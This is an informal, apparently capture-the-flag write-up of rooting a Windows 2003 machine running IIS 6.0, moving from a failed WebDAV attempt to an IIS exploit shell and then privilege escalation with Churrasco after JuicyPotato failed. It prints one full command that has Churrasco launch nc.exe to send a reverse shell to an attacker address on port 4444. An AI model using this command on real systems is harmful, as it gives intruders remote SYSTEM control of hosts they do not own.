nmap said someting about dav .. but when we did all test failed

then i looked at IIS6.0 and it gave me a shell

now setimpersonat was enabled so i did juicypotato but it didnot worked

as the machine was of 2003 so we did churassco

`churrasco.exe -d "C:\wmpub\wmiislog\nc.exe -e cmd.exe 10.10.14.10 4444"`

and it gave me shell
